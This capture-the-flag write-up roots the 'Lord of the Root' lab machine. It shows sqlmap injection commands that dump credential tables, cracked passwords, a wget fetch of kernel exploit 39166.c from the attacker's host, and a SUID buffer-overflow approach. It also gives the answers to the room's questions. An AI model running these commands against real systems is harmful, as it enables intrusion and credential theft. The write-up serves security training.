# LORD OF THE ROOT

## BASIC INFO
```
export IP=10.10.52.33

open port:
	22 OpenSSH 6.6.1p1
	1337 http
```

## CAN YOU ROOT THE BOX

> - **Hmmm, what method is used to reveal hidden ports?**
>> Port Knocking

> - **What port is the hidden service on?**
>> 1337

Navigating on the page (port 1337), found base64 string on any 404 page.\
`THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh`\
After decoding it becomes `Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!`\
Finally `/978345210/index.php`\
Have a look into it, and found that it was a login page.

Using sqlmap on the index.php we got above.\
`sqlmap -o -u http://$IP:1337/978345210/index.php --forms --dbs` found that password is injectable.\
With `sqlmap -o -u http://$IP:1337/978345210/index.php --forms -D Webapp -T User --dump` we got a list of username and password. Only frodo was able to be used to ssh into the machine. 
```
username:	frodo
password:	iwilltakethring
```

Let's try the other database, mysql database and only getting the User and Password column.\
`sqlmap -o -u http://$IP:1337/978345210/index.php --forms -D mysql -T user -C User,Password --dump`\
Now we got the user root with it's password hash.\
Crack the hash with john.\
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

root: darkshadow
```

Now we ssh into the machine. From the nmap scan before we know that the kernel might be running on Ubuntu. Simple searchsploit and we found tons of exploit. We are targetting on the local one since we have access. After some tries we found that `39166.c` is working.

We first set up a http server with `python3 -m http.server` on our host machine, then on the remote machine we use `wget http://10.8.8.177:8000/39166.c` to download the file. Compile it with gcc an run. Now we are root.

Another exploit would be the lucky door. While enumerating the machine with `find / -perm +4000` found a few file that has the setuid bit set.
```
/SECRET/door1/file
/SECRET/door2/file
/SECRET/door3/file
```

Running them show that we need to provide a string to it. Assume it is buffer overflow. Note that the file that is vulnerable to overflow always changing. We can compare the file size and make a copy of the one with different size. Next we generate a payload with metasploit's pattern_create.rb with length of 200 and input it to the file. Inspecting on the dmesg shows the position where the seg fault occurs and using pattern_offset.rb we know that the offset is 171. Also we found that the ASLR is enabled on the binary. Research on how to bypass ASLR. Brute force it sounds like the easiest. We first find out the address that the binary jump to after we overwrite the EIP. So we are looking for tha address in ESP. Then we create a long list of NOP to work like a sled so if we hit any address in it it will be redirected to our shellcode. It is shown in the [bof.py](bof.py). Now run it and we are eventually root. *Note: If sometimes it succeeded but we are not root it may be the vulnerable binary has changed place. Just re-run it with the correct binary*

> - **Whats the method to exploit the system for privilege escalation called?**
>> Buffer overflow

> - **Who wrote the message in the flag message in the roots home directory?**
>> Gandalf

![badges](../../../badges/dianchia.png)